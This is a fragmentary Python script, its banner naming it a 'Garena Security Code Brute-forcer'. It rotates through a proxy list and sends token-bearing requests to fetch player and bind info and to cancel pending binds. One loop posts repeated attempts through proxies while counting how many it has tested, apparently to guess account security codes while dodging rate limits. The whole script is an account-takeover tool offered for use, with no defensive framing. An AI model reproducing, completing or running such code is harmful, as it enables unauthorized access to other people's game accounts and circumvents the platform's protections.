...
Supports proxy rotation from proxy.txt (lines: IP:PORT | TYPE | PING)
...
def load_proxies(file_path: str = "proxy.txt") -> List[str]:
    """Parse proxy file and return list of http://ip:port for HTTP/HTTPS proxies."""
    proxies = []
    ...
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            ...
            if not line or line.startswith('#'):
                continue
            # Expect format: "IP:PORT | TYPE | ping"
            parts = line.split('|')
            if len(parts) >= 2:
                ip_port = parts[0].strip()
                proxy_type = parts[1].strip().lower()
...
# ---------- Request helpers with proxy retry ----------
async def request_with_retry(method, url, retries=3, **kwargs):
    """Make an aiohttp request with proxy rotation on failure."""
    last_error = None
    for attempt in range(retries):
        ...
        try:
            ...
            last_error = e
            print(f"⚠️ Request failed (attempt {attempt+1}/{retries}) with proxy {proxy}: {e}")
...
async def get_player_info(token: str) -> Dict[str, str]:
    ...
    resp = await request_with_retry("GET", url, headers=headers, allow_redirects=True, timeout=15)
...
async def get_bind_info(token: str) -> Dict[str, Any]:
    ...
    Tries direct request first (no proxy), then falls back to proxy-retry.
    """
    ...
    # Fallback: use proxy with retry
    try:
        resp = await request_with_retry("GET", url, params=params, headers=headers, timeout=15)
        if resp.status != 200:
...
async def cancel_pending(token: str) -> bool:
    ...
    try:
        resp = await request_with_retry("POST", url, headers=headers, data=data, timeout=10)
            ...
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        ...
                        headers=headers, data=data, timeout=8, proxy=proxy
                    ) as resp:
                        tested += 1
...
if __name__ == "__main__":
    print("\n" + "="*50)
    print("   /fastbk – Garena Security Code Brute‑forcer (Proxy‑enabled)")
    print("="*50 + "\n")
